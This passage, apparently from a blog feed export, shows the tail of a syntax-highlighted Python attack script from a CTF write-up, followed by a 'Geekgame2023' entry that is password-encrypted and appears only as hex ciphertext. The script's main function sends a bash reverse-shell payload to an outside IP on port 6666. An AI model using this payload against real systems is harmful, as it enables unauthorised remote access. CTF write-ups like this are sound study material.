    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"http"</span><span class="token punctuation">:</span>
            url <span class="token operator">=</span> <span class="token string">"https://"</span> <span class="token operator">+</span> url
            url <span class="token operator">=</span> url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> url
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'URL é”™è¯¯ &#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    attack<span class="token punctuation">(</span><span class="token string">"http://172.18.0.4/"</span><span class="token punctuation">,</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/8.1xx.1xx.xx/6666 0>&amp;1'"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Geekgame2023</title>
    <url>/2023/10/27/Geekgame2023/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="961c5797e0147bd196a092cd6efefa5fdf6a5241428179f60fa9d023191a9df2">87c33ccf373964f94b22f879069d2b548b7e141e2dd33c53ef59face8f1c9298241552d03707970365421182d469bd9a62a96ec95b5014348bf22d6b6b331b06f48fd21578862dd7895845128e258f1e80d42aa6b2e0477e7fd334bd7fdf60e73cca987f734395a14c06474af9bf95c31855ef21b14f0c5780cbb6c5cef0feab0a4248b4df0c9bcbed3eac50f15bbfdabce42f3f6aa923bb57cfd1ade362bd37d94e5bb8e8d4be94ee190db88c3553d7ad7023a4cfb9eb7129c55910e7d4318ff4c7ba013655cb80f2a45cabc9f91f2aa0d0fb29884261de6ce61d095b1d9d0554bbb4f19d3e3ec3b1df0dbfeabeae82688e81ba5f266c72c180df5c1f1ea1e915e7475c8af143c94c0b8bbaf4ac06ef0dd28371685c3a9fe39bd345ab755dab86e6f6df2797bc9daa55b4d2acf5ee4adcb4a79e66409bc47f152e839037210254c1b0b025e30814add5831fb126dcf5e6b6eeaf3e361fae1f039e210df7bbf6aa019313b4c8a0566d7f3b35c8dedaccb239bfb31ef41d62bd5ee85192f9fb0130767c94cd67919e4a10ab5aa7085f449e5f8f6056350f23e6f112f2a4f0470af119c66fa8cf11f8eb9d74b4713efefa9645c5a176a086975c92112e9d4b8645dc6103d46d03bd8a5b12ecfed1c59ee36446a36f3bb21588ac2028b2cdacaf4b4603c58431aebe4e79b9c4ef6912fccb9e4db18e4bd323616da7286ca5c24f9f3c5647c3dc1710cf98a5a73519e605aaa252eb1f2b8d226480cae3fb62ee6aa1d0224ca1931d5cbabdfc285a6165fa0cc907012c12c7e5a02e8fe157eca572744582bcce0a88db3b3e007564d46de264aeb42671c09b6cd5ed2789d60f7d6e6fad848e4f9d69a03e5fdb78fc304f9067a55fa66b5d315bfdc2a2db93c236f218e7538abad7bfc97e3aadb68e83462ae28ea4ccf45d93f630bcfb1afa110d56457106e4da7f38923282bd1de64cd881a5fd629e60e8546a148743f055a7f6eb53658279f7884ccaec66039a799d40b4bc1471c19e58cf7543d174f391170edb13a7ba94e796db0663da32ea7d38b74769573c6ef19f7b8980809c3df316a03c9c1b4045c08424b50b05aa3dc275134ce161b7d45a88d5d7278b1779a4d3abd880a66c3e1baa7c04d1aa34f0539e01ec8e7474794f7eed3a7c859a21472f5484271a8e0c80b92ea3685a0147965cd6a55fc1a67e4d2216452290b1d97269fbc74ca2897beac499f42f0b901ae08fe42ce2b05cb9b8608aae533dd620873dd6031e654df8aa990cb1a55c98fbe0421dc6a913f59dc2bc7f3c327e7301653b911b9c53c9815de8e8d96a666a70da5e1faa9c64e2314013f2ffe23acbc54aa8566da413175007430da93ba21ad58a153acbf6bbaaa83ce755ab012d616d1f412f43207b3879671c8d0eab8367ba8100605c83a0ee9696d20a06a34650cb8d26715d640f1610b5d300059b50838a26a228feba9e8966e67dc4c85870742fb14f79ebf0d2a1e37764f16753b3465ec81284c587c7f25ae689ab84b366c3a1aff0a5aa26f50bdf80a52bd1be55616bac56565950fd5893b812162e79c8b967459e2ddb3f165f76331385386862ed8b4d5d32f7738ff98afa9e42f071f3cb251ce910f4ad15fd04c344afc0556c11f999ff94bcfaa195375d08058437c1aa5a063592eb528de0fd68bffe902581a99445783eae3412ad9b681422d5606061c0f3399f31db36153c1787fc34b60e782182858fe25fb3b256a67aaea7c5423ed51d72092926441342a76f1219933444bd68f96732a9403d8890313fdb1204491bf92de5d6bc0c7fe334f2546b9d54825d27e750d775891ad36eed7282272d7a7febca42e9b10cc10d2b320d39994d6683a769b7b58c07a01c7226ae1e4f24e4bb8ddbb49cc2e508e07840747761bed8fc8bef886559b347dce5c4676b1b161951c991fb199f777dd9b0bad5e3a4ffc45db3abac6c84884a36bb5c36996d470e555bd214cbae332682309cbf33177d4ef66108825db86239544e5bea116b1dd252e60315d51990118bd18a8c15862b042c30ee48aadf22cb3d06f362ce16c4e876511d691de757f45d49d2e24c4bccad0120ce2ef7023cc9eb9161c5edf2828e1ef6589c011b42a7039fea31d8e1f29dd16123f9697eab6b5cc896fbe64fb60d9aa5bbae2cf9fe54f1b44f9b0241cf9f7ec382bfdf655608fe2143c0750d289db346427dfee737981efc6fa92de2c18ae56374a4b8b13b02e172fee8a9abc06e1a051fe18a8f818e3fcaa7c21322fec4243592f5cb2307b6046aa46684c15fe835edf90bee3f24960bd7e07125ecba4a465b07f9f35a8248f52285e7e8194c2b8a832753e524dd5ee9b759e8777565c74168619cc0d2eb4515be948ea2c8dd823fd2a645cd5850ba2572272f65aec408387fb8a9660d4abcc58305b0d8726a54a869b3ddea63ba4f37b8c091309587b20bc834e47af2f66885eecc91c5718f1a462c26a06175367f8b13006f257d4ea08d5ee5adfe60effa6c70227d4d300979d759ba7c272cd23d67832e430b7bcad39e5a67b147439160a69793df7b99139958d7a1a9ba0f7fe5fc41ee05fa54b7d2e857cc6fa12519565b0383fa1c628a2045b63396772e2a4c1437a67560fae2e7433dde841e113c9b34307f347ae1495454f6f42bbd217c9fe7c45c6c0ceab060dee575606e841f222c5c0b5de06fed06044e1a3a551510556f359103e4e273905e673b2afa670394303d676e56e586261bb79d7381140e90e174f644c17d2b59b80854d7a353f51c9ccb0061f57f880185b0cac9b9dc74ed295a2398c15cc0a0dcc981410bb218c0ecf9c66afed088a91d0b6fdfe646fc359b8bc6ce87f412ff9605f88d15c45dc569adaa74468903da16269d6bd5737356dbf055114feb72c604f8bdae22f0ac4f9b638b58570603a7a5550b55189e6abdc8a1d192b9854ca4213e683072e0418a371f9122a41fa70ca4d8e4e0b775180a081f6b3a5267e4ed691644c4f94d81c2c0cc7aa8bb89cb08c2f0785c0d9349ba9b27cb9e2762e6d615a83d131fe441158b884c2eee394b7d672543b62fa16ce55229576d4feef0859439e34c0a0c070149640d04884cb8f17051fca64cba3c6fd2c155c1454da313db0bebe6df0f5ff8fdb9d2111624e2e9d90823cb81144d42140badd496e95c265946085358f65744e67c96554b3aa4a80fa2ba8f1e0c9ba260b8080cec536b8fe8e008e5a9c51f83fd3ab128be17ac7a7d85be57e6003a62afdf5cdbae4237eed94fb87d8e78b8e76fab82ffd95174da9e1df5c47b1872e8d78a5bf0822b9ca58eee5c5c6b4e48735814d4dfca5a573005fa358bc3ceed7d26b13db0dfa94d6ad6e3c7629347df1db70810a843e4aaf43690dd272fd33a0fd5a824187a347d048681124aaf003134fe4aef1669317e49cbd32fbb94a88d2288a8bfbb06fe29f73b0888fbe5f44e7a422113ec08aab39ca7ab508cfa771b7486c73bbd62520c5c558a8e7631330b7a570348527266f8b9499ee13a75d56cfc58dd9b3015af70d2295d1c4ea8f539ad7a5a9b49718eddc043fa2d32440ce6d9008d7b6bf13cb024a09316c34d253685d8c124ff3e1c3f0c71c2e7e96497385a23db2ed650e74ff047d8686a74b304927cb8f70e3b47e024a029935cadd0b32d638d1d6ec9d42a46dbeea59d572971cebcf23042f43a5b2454265a5cd0bd3463701edfde4d2df09645c6028144b03050e7f0e53bb42df8115a00230ec5f8eb7649ce1e56c1b70ee71898dc25e0d267bb83818867c1f010a9469730a322da29895151e9b28068b2e6fe8c41e73d1d062efb1df540189512c9a2870e507f131a06f9f0107b2a4cc3170daa55d5d5a0719c811f40f7386fb8538426c2800ae9858f23e5b8d526b1cc7c435c953ad1c03f07d7d19e2f3f6824b42f1e54afdfdb8f8ae92348372d9aea94178fb72f05ef2a276a12c7a457f542d8c402e1335a4ae52ae7c837d5fac14e845ec018f35b22e870d782b1287efef597a74ff0dc998b574507a1b7bc02c5e342f6ce0fba02227f08c6fe03a14f55f16204ff4415950578909ccba468ff895a13aa102999b59e35b7878b41336d28f3eb5e8c4841f3c3a63376d9fe3292a228852f7f89fec2618b67a5cfd7ce47dee65c412a4d5a6580f26b96155f3371fd0aade524c84419954410d512fecaa9523faa65252c9d6db1966c6e3ad225673b97171e7e135a6dea8d3d61cb4f882455718666f12d94722aa50328f6079850f6a9231be15af2357148bcc72f2c97ba085226e0b17b6fa20a0ccf1447eb62b2e1496b76a28d49bfcf30edcdd43571fe75e9de45accba4d47df6f39b0d1a0abcc4dc8a392b03a365eff853210e3431157fc9a3a5b0ef62de85a7828c3dbd0cfe883956cb9741e3106f48205d0c76422ff9b967c64fd415e7a6f796a13b946e19d4086b377a6fadbcd9947f3c3934a637f3dd251ed1db4f6418c104f872ab6bc02cb6fd1efc9d674e266ef1de8728ded25985a1e2ecbd06714cf2adcb4960efc475b9a1c04b527fff5943a60fd161f0d1dfa94cfaafeb4c99f48b17978228719836f65e3970f9a07fb9260b846b9c795718da3e9945eb5361bd0aca254c32d1e2ab256ffbbd006b9d9b598f3699d269f8867ce8f9cad97bc9de14a24807a0ec7573c6bdcc7eb0dfc7735c0ba3bec68b0ab4fcd9bebd448c4a7fcc5d51975910b14c4ab182064b47847901856aaa188e067c6bb14222ba8c45abf557ddd541d9c608409c05be4f0a66e0de9949768f130666377a7c1fd7ae882d706be40134dd67abb70c3ffc80914f2743fcc878c08376ca0facf29107cac998067e0d0dcd72ef76a822e5669b3d5d70bdbad43cb5fa9b4ca95e523de8b8873a03aa4b4189b48a86bdc0d999667a6badcc0f79b88c0e7aabc5dfefaa8ea0efacaf8931c56ce6fe25997dfe25d857328623be3baa86e9252b5933f8f2328138c460059aa3d041c5183a1c8ae1c636f4567e344db5a7a88d5580943772dc125c7b9cdba27f73cefaa83e9d3c228fdf85d16a04e914d90bfaf010549bc4b9d9e8c3a8e94dba9e8519b41dd5db44acf54e1b01bac6a70ec9a75c313f8db0684c2a30d57dfc693dabc1b278b3b4a5a37925f113522e516a77bb3efce479f02e8e37368ffb324968dfe590eb98637ed21d8cc546a183afcf329d73b6e590fe1864e77cb8b8c867f3051baef3a46691d4b7bdebe15a2b8317b7bc9f26e9300a4a76eb89b708a4c82aedaf402d67a47ddaac3f6b0b844f1b6aa8aae02915dfa2df4c68443cecca32f513f72a40fc525347cfecae1f0c3491dd68bbd9861f5432cc02f0e9e05d077771ab136a3632eedc6f9c769a213d8853e26285b004c9060f91969cb5162e72defe4451495d21cc43e0b3c27bb41a3d48a65c74bb6861214b6f8eb2a599a0663292595b62043098afba7304ad3ca8372ae6740136b1ca4eab940ee9ce0ba3d5e816fbad23bc52a523f6bac41e5c070e807b8b804bd04f4361e314d92ee04c038a53e9b5d8b9a80a0a37de2f6a3386fcf31c0cb0bdf315726cdfcde170eda940898dcd768ad0f8e99fb9a76b74ece211cbf05567abf41e1741bf4d6de843149c3edb2b2624049b39630d71b8929d669164bba97a363204c70ddebc118504099bce78b20c3cb647a4e30d7ad66655d274343c9b38a24e68aaa5be7fe8b0b2960a35179d9e7d928700d434c45c420020ceae1a03c685f11a90bad1abf36096d5b3688a6c62b7ca6705bf2d8e681dd713a9f8981c518e0fbc9a33c22b049e7f43d85247292551915955ea804e80c65da3f32e29b6f87b7fc72b8cd9fde5e807c7c24271ff3ff355b50e0323ccfbae79f0b81ff6c26f80a3a3501e8521fad6e156d93656a4335e033661fe10bfca46e4308b7a5f5532f7c39d14274daa147e8726ed56bfed7286e1599ac262941be84edc7e170f10fe5b4a9c22950d75368c7cff2c1a707749f2d7da4315fd1e80d6636f44369af61eef9587ef0a4866a059146cc352675976e51e088a86f15aac85cd2db881d6f09820c57cadd182684f8a7eb32350e43b2a8429e57267c6b330a78b4a44bf8f4dc0efb6457b0d39989d4c339a44f4c8950176a5fe3e0b97baaeaabca7d2457006b2619f9a3feff8f37f384003448251947d9d4c0edc674da4976dc9ce047c9f5c8d429627ddc6c6b0de88b3f1272b37032a276aa4bd1586ca2d6853b86c7f0c7b3a637c53754cb79f954e80463c43b310f96c4d1be07d45dca2482e3f52774454ea6a4ec2037eb8db4768e6c1a58a75da6e6596df4bcfb1f3a353a9a5ce55f80af1c6a170ed5bfef499160678b0c46968ec4873466293bdbaf8720a171e742c2420c33ddd81a8fcd43c68ed6c140b22e906345545835ba25b003b3e0ecaf08b4253fc53ed4044125d0584d4798528419251a173eda7662f1ecde569a2d9b331a738710977bdac7718cb8cf11b75bbd80bad84832cafa3b3ddcb1c9d18920897d3fbb1ad6d139323110a8398582e60376f886b13b9f0e9e7f87969d193e2c2e4d8fcab1ebf71543a47c49728771804f928f677ad5f69f6d691e0e11384450f56c646c5d388690a773f0a4955cd8f92c9e2187a489b0ebb7a56a91a417ab4c2fe19c1fd84652342ae81a23ea9a426763b578a2a0de5ce8f7faa7ba2a1dc541eb4ae24d9a7884aca05c529d579d15943ea8fa4c330cd3d14d0e4764df8e977e3f9ca59daaf3f79902d23be5a81ee234e500852c0ad71f2d4436407a055579a0a575f7dbe075f5ba80cd403da60a03ffb753a6224acfcaaf081f1a8b0e37ea7ffaf892755165aa9964de1a710a05817e60d8ed8e96e1110fa1c0c7f5d4ca26d47beb814ca8fd783d86c21e3096244af3a03bf2c0b50d1d4a54fef3970440d4546c632ee4f87a71e2a5409b2e73b64b5809b11c17f272a3690c10648a2c782cee3a108a394d55d852004ad10c9352b09226ec7b3d2c15852bf36db0e6351be1124e13feea4d873dcedf1fd55c533aaf2821ab63d012032962010af0caa323b6d03a0a3f1b16d186400d6c58393e4b1e0fe5c53954036e0df12f0036ed1105d0d48d347452d1a8d8a0df9a7971251c133e24567d50fc0c8e5b64b3ad92e7b59196eecf9c4c519c356b2cbf9e1a05218efba4d18569af3cb876ec449eb4390a3e8d21655aa4615092d606d1fd03b5a94bc3bc52eed64f0882e3f97fb5eac3d6a0576b8e1d683b015db11d962782909423abbe1c1ab2122c7f71e4eb890389e993ab987e2c9422c58ac9b2e6c92f9bc0d51c6acbf3ed2ce7425bd868e4fcf54f48b489e09046e6c9bca98b7faef5a0028986651f7cb24347782c212c248274ac2ac6d3dd202515d519060d4feb519ecb06569fe7e6ffdbadaf9989cc21a27cfe113930aaceac79b39b68f8c92124ba02484ca78f8b2f57554dee1aa2c34b230d6957a081ec2cdcf5bdc804d400843bf487fd7e1c91513f9c25fd5657d2d0aef2f433daf0b97d374358d60879b86632dd33060581586bf2cded85a3f010449475cd734ecd1a4cdab9db73c4171b5485788d65b4c3f7dcab7423afba68e87baebc01f44f9bd72c5c3f4543334a1266b1d666fdf6e74a744c1ab11b81a13e427e270214369cf6aa6822dd241ff3781c5f08a1154ab85c89ebb5e3b1554c503e5d3f6e814d2856ec1258c5fb394c06900aea15f54a2a6fd8813237b00c0da2de73bc3184cab79f675fb46b73dad8d264745d89ab5052efff0037066f2e943438fb8d08b821adce3d0a3a1c9bbf398094288bbfb46731c44c8b83ca43a3636a51ef29483acdfa7074c651aaadbe685867e7aad270626b9635f7d15d9216d6c06d1b7182142696c5a4c50e1af0cc85d7ddc680eaa60c4666babb4f8641539bace6c425f81470c1b2ebbd791fc0156e91bf948fbb549badc75bf941b359efbcc0c63e4f6ca3e86160035532991795ed9ff613a1c11e9d6c4fa49e8335c26e87a5659d925dd57ebda6b7d0e56eff520abf86d87759f22194b1eaee680337d85bbaf2eec7454a3e946efad48dc92de018ecddeffa097be6787ce4bfec143a4e2a9781fdbce69c72b6fa154ecb8224e90bae8f97973415f3a6d33a0dfa5980279273b9d02ce56ee423d2f316de851f7066b01f50213ca48cba3a98c4acade502388a8d76caadf572f2f692b1fa83f76eb20de37dc9f50dfb753017a3e59a052e3c5ca240af8e5cb2d5d89efd5ac3ad008c8dbd17ae2614f72b0fb0d4baff7f202eaf9b7e10d000c42af45b5694b088700e37b1fc8d5f5a4d4e8390a0b928f1ab8b5e90a711257ebc5e02f952466ed1935674034477b8f1a2987b285e2f7d7b24d0769b1b9e2cea9c94a297fe6f9fc47013eeb1f86a8bce7c20d31770aa40d27fe29c79ac5394a7f3d0ac58cfe2201d4885bebadc3b22ba01e8de50b2863195158f9aa9122106c94afbbb2f3109f68b588d93c1e7fe66b81f2853bfd30a5e8f4905fbad4e8acc8eded304a2cb44fac625fd9e1264990e77ac19e69a9e58c2f8fd28f849012dcefe2564f6799ad36f031ce734b25795bdb91f5a8ba6b109d249542d895b75872f37857beab2ed6e627e6c908e0bc6a532b385482874a033f64cd355e6437781f3956c2667946031b4ddd9eeb10f9c318c06bfc2b1b03a65e202755c4671c6c7622994352464357f2a6ebaadf29000eda8e5d2270e2b77f03242679210574c218097dc547aa253774f9df32f0296e30a6361f898b60dcd718a27814460a6846a7ebc61fc497ca5e7cbbb6c28a9d33de14fd7c004caed2d01d117df6ac66f0d0d01b9549671a687044df75cb226e59ec8385fb45e8754ac2ecd30a374d2b7579b0713f2a18ebf93b41de80cb427e5945f59f544efb05d837886e32aa204115be3f1fcaac73191fca77825b90e60d0bcdf735b06f9bfa98b4da87c03c641a04dd54ae486156f0829b8ff03bc9a6d235cd62b324369833728b128e10e0a7512395e83e93488937aa72c7544b838460b33e270808207e493a2382ed74296801b4593d182d522eebb6e33ec63a597699c84f918c29439f88d3deab666a0ac27a2aca700229492f6764256c8d6c53bbc364326d6082fc4bbd221c247c48895fef594d6b67676e8911fc6ad7d781f9bd56bcd78e8cb99c37e53270037023ebd31fe3df0bc1a27e520a6e195df126da6f935497144f947549e431a10b2f9fa7290023f526943d6d7b74a11d43f78be35cd8b49a14036115f54387f96bec315d199f6ea8bfbebebbeaf68305dd21ef2687ecd699832239e8b6aebe37d6454211f7acda3c3ecc5e7a0480cf9f6e8d97dae83440482cb2712bd3ade8174ea91b3b940c72027db2b2ffe18684c06d3ef5dcc68ae52b04a50e1f6254c2390537bb3229a66778ed33650076253268ed4a14c90185a89d9727ec6bb86632e367d9d4a86cf9747776c79fb9d86633eedbfe852d3bf45a22fce9fec516b73f7ff0fd4f777ee3c9c34b84765aae011f35f898ca0e021180f53fca3129f774a6aabbad355b388a7d2e9f74502495161b6c212b83bedb1f678d73675ca8297430c23403b902d5edca6d70cb4c8e5e2412b383ff7e2274a79cb1b61f60460801f76d7eb0ba5b4eb3b51d377fd8037bf649d823deda00ebdfc4d3ef65aed63c64cc61196552ecbc2f584960e85fc00f69278f9f91ef05927170924004f9885bf4320f69b139d3fb509e44c87160cca41672a2e98881b607e909f4f7782ba2eb1b440717d55b068f1dd1bb1e121e1d8be35910fba1b9e9c3c35bc0a8f5349cd7d05fd4b28a9222af566a4878306b36fbfa64d33420f48764ce96b541cef15f23cc3336048fee5c26e3e97feb957b7a323e55f074702d237d0a3d59c1afe9cc7601de5c65c46549703e2c76990a79cb31e0d41c8be589ca901d03c8590fac0969fa715d91566234e8db971b74aa67fc7e4466df2de9268159ab4862e994a5f7732e3e11377a07f0432b3ab00100521593ea84e6bb7b64f696448807311282f8c209346adf9421b4bbbe92e8823e8f3df2e91204ce3079e93bfa6624d06056103a2f19865a5df6a47c98c30979edc962e312b1bae7f70cca7e5fb7a17eda6d56df39da20136686c9469cbc8ef174ea80bfed372f70cbf53cb6ac79b483ce31c22a15a124f300a59873ea6bb51320682bcffd3b3652b79d276d7f81a34fb98e62475440e2a76f73ec49d900fe5cc769a79fe3467e314b6c335a62deeec83c3a288ef3968450a0d0e17f127010aad5c20d69a723f2ee393c6b312e93ba9abc5dd435573ada94803ac642d5a6c6505446bcb5efb1208675a71bc1f41965e2adc3e5d95d1d25c3f5a3e343d22738e4219f42aee7b74225c59c53fde0a09ee69c59271edfc5ab5758f18098f9e4060662d6c4408e6e629a76c92cb68000dd0d938d679c7c7a41c2b721a59fd39d8edc9c5fd91c64948a0fbb24320851d9fda95142abbdd330c215451eeeaeaaec57f2b1b41f02a2544e4a4e098de2bee481a2786bda3ff74304158a2d2e7688a2d980d2d4baec1ea56df437eebf4bbc6d50cd4903008c57afb86490acec7b68a76c009d2fee7d45100fc8301a2a4c6fb102dced0801dcb8f4004c56f3405bfdc71dcdc68b1beb6593405ea33e4e35205a64d8d5befacacd45557ee76905e97a0deaa475763aee50a09b0840fea20e79fd7d6a37e57f657d067fe98c9b95cf426cf329fb6f76119d9a866a2a28be347d01cbfc759cfe89504fc085cc036802bbe26ab4456634e70f47d39d3b62857398398e35d9ff5f72363458463e60eaa840d877a6753420e891ca3459bcac2bcee4d6033409d408f6e6e15c7c0074b3e0bc5ca81a8d42e9381245f14fcf5cacde3f6535414383fdd18e36b1c52b725c1c82274b041ae24dbcf99101153daf7b73d126de498baa1dd0e12e70cfd4440e71d95a2ab7cea4f245418c4d4393724a22fcf398655f406d61f02768f9fce25126153215c47c2061f26e890f2e21dc1b292f5cb6c1ba311981fb0295f45fd8aa1178070e82ba1947f8106780f880f03b1567477ab4b23a58b78e9be2976b575606989d92b60d1fc7ba051e9d931216172b844873b98b790a463019ca35fc229a8c4e449b5176aad85584a9c77eb7dc78d7f2c8555cf5a60d91703299bc6cd218e671e2feb9d77ab0dba32097af0465a113781a1375e0da16eb72800d82a53c000e028af37bbcd1c888296d1593c58934d998ca159ddc928618aedf9ee9ed3e7ca806077a9d9e72af3c908a0cf1b08a159d40a4d2886786b1d45aeb0b7d08e1dafa4287fb9457fa278dc13d092bc68416f958692ebb3cb38d76df423e32bbaaa22036e1a9f6724123771123d2511b52b13e86a7f112776de7cf626a557ea258b7d228e13c394b93b0319c17bbdb467290b0c3a244d54d5a3f6179c554bf7d780fef12c16c3d360c19ef9fc23d7ddaa0a533d4b3a95c823e769d519a614a5467903fabb4abf56623b17901ee14c76a486b632ff31ba555d53f06ed014cd9452e3e1dd46989de3cf8e055175de1cb1a5b7cabb0474098c1909f87ac27289ebcb60ddc440a997622dc9d83c9fd20a5206a21db61a347f801b25feb257db84417c99eab0228dc36cdd48e4dcde13545e3d5fd4ff085ea67562a4772cbdd2831501e660f12cbadcbd570f2fb7482a7b46a28b4f22d328d7d2c0e2b0b0425cb10e052bb733ac419e60072ae95c03e07aa64fe9e9a48b9201946bfbe4dc4cf8052e396966b719155549b009ec0f6694237bf1d11664269d1ba1b66c7737f8016c057821302769f3fcbd534b0b5c4dfd1eff48461fc68be995895e3bd7594035fea5705f8df1af0c2d15b6c31b194fd57565dca8de9053a3112acea554e430517a71e20df83fb5bfdf471cc3f22dec901bdd037a01c36890bf40dd2cb10f2dde082643440786cb1f87a7a3b1f12387a127c398b065cc6b112a88530eb47522f4c54bca239c8c835953ad6a8752e9bfeae59606992abc6103144fbd3a7f62701588f74ef3dd46229e89a96600d6f3a2a0f9c4c51908251b36837e6cf7fe897acccbca1ecf8d7eb0a71f132fc2fdb135e9036466a8bebb49a760c3245ac1611e9c9c8187000708ee4970e217c666b21533278fc727e4dda54d0f5c287595f20c3301c303a3732532dfc843ed85c601580298301465d9eed550737c1638857236c964d45fedc1d09d55f3564b8f3ae0ac7ed6bd25573e4da5035e32dc09a533436a73433053c01c094489ab5e2dcf4ce428d41fd702a8f4a53e3e551dda20430839e3060e930f59a0930071e57b625825d218b2f7974bda4fe5d973bab2af570fca6b712f7b711557f14d2b8586a58259017bc5b43ac719b4f6d7f49a60103474ef1181a8a5507bb145486a021ffa84e7d2dee5ecc7fcbd38b80738dc8beec56b3750a2b055a9a5e0663f4593e6e08b0cbe9ae7b265b75004721cae7d5559f7a74a5efb1f7ba78351bbdd72d3e4a1a57a3724366372ce7d25615ebdeb71403da17cdfce6a742dc7ea9d1a7cdabd19286a356007924056b7dce8cf648be84e374d9dde5469602a738e4cc565126fabf9d47e5c45da8213bf139383ba01ead7f85813e73666bca6aef684ed6f1b720cbd855f2853addc735981a9dc67fda51e4656d39acd23691a10ac7d135c217afe7f85f53feb14ae9af81874619c35144865a80e50c9a6347092b95031157dffbad205ce41075b4aa1736154b7d1d90895eb3354883aa2f0358bf5ecf299bf363930483b45dbf68846dd2642feb023346c8ef7a5026a0c9994a6d513f06a5536c4ac16c1223d447e5ebd595728e2ea24cf5e8085b239d34b90fc3e8c26a355688e206b2012798ff2ca14e92e11c7664d041b2ea31153a915e6d1e482ad5d67b527ec83b03599895bda443b7c088a98d4977105afdeb0817595c48af2c16695d9a20ab634ea3059b75197d2181522ddf86bfeea06f49a84c9ce0664aa9a22037130782077aa900ccffde398ba8940b03217e606825b000df777b3bcfa846265aa501dfcef0c060c536e1ddc2c20b24111e45b7cc84c7877c0c039fb11b1e6ee969606b9f408ccb7f799b28614ec9801de90b8cd519ed624c677ac59c77df241d2df16a086f62ba1a57319131d3e516eb11f385988b87b8396e3d7e55abf47eaee569ad43ee70f29ee395b69880d7152e27ada954b58bfcb583fc99cf2ea85dad8563028525c4ae2ae7d9fd5e19de3ec92e34c035c7ad5a754cb560d8bd5f7f90bf2b7b7c770efa999bea7d98bb5c229b74de5e777dab6d699de7389eb364800b60326ee4255cc712dc2bc92607bcac1cf851449df52a8c29e3a8d2c0568cf243f34638130aac86e094d33131ca9a50d2747756b0bdb3ac7ad91912959427c71ce84d627a7b10378bad7d144c4197f3794ad42a0cfab2a70af8110c97ce48e85bad3df4b302fa2e560879b2cb8abfa732266e79a6038eccf686a1689809bffdafc0d74d6c5e5c689d4898c8f482af2c450768400dcfa08f555e96b6436107460ee0cb9642cb421561d0fca2d0f7ba4ee980a8c2330df03a0de108915c0cfffc39d3dcfcc0315ef2f1c3c0a178d92f1e51cb3a1f40146f49e5d27f87107e3734b1dd0e71b111af2570d1e27e7123255409fec90e348eaa4c3e93b2e5e6327336b7194d92a23436483cb5e45bf12b4a369fb6a72e88912262a77725d25b70cfb0f0af3fdad7616cb10e94d6a4d7b11801674ac2119e8636166b32f1745906f9a7930b349f66fb129ac85688355e6d3cd0f77f15bdd4e331e486f1a2695c379f5b1a401d05bfbe3d5c1c13cdf4c59fb38afa579c9acd47fe3bb49c053677ae7653621e415c79ae0c4d83aeff5218df4ff276ffd21deb90ed2cf2c76226327a848221b88676be463f064832b3c181ba1daa5e65e290f2fae35af98227e58e08f887fca20decd1dc025fa849b8e8f4e98286a68047f1fb15b7674d6779df6091126014cd62ec10af7ae29d83e07fae99c2c9f9f816e65cce50d4f99e9fb278c1b94e24e5834ad78feb595c632f5cb85dc77036d55792df8b2185c604eea72dd28386bb7966f33c81c4962b3c2ae16bb1a618000d4012935e95749eb17407e9e4f2f8acc319a789af55b385bdc1703060ca64b2ed2b88da941680c76b7c9381b4eab860a3b7053af8cc5e4585a7dde0d0fa5a8cf5f5880fcd738e9fab2463a395206f43b916042f8a803e096c7a6cbd754cd8bd53835519b596cc912de91198c033fee91db7ed51f8090fade631fdf1f1e6e53987686bfdb376b8c3b37348435d6a6dfb96dbb724badf20cd8b85fae82e1886f6a61977b9d69e6f3f445a408d4314e2acc36abcfcd04fd6681c74819e5bab12207200d7f76371271a2b0f9da36c76302261feb9fac5541bcf7fefb83a2f618f15416c954c5d9dd701c9f531651df7f3c9d6823e6fd9a391e3b1efc95e844459e71b07aee4f2f886894e51f4485449aa7534f6b6a7461803633a9350a6871689083fd0172673cacb12856c262c805d8e300fdee6a20e5e662a36a2cca43c3545e23297a202bd79b46751b81c26fee8d8ca4a8c673442cb31bc9e95f002a36e6371c6e3acc392d69e87b8c82cce486ffe2af592dbbaa2abde203539f2fe28865db415b7a5a9356d3dc2a309378a24c081d5fdba241fd7a64ede263944cc0df36bb4531cab776fa6777e9cd53da138753d92b518c3cb6c565262d940761086908c5141327fe499e575fc82bcf0a51e10890bdc03fd2edfd4638de79e41577912e1399acbf80c1fd60949a1d8424d34c06ca9d3bb16beb1bba3f6e79e81c69c3a99cd3196446c8a221c361064f523ab29cfc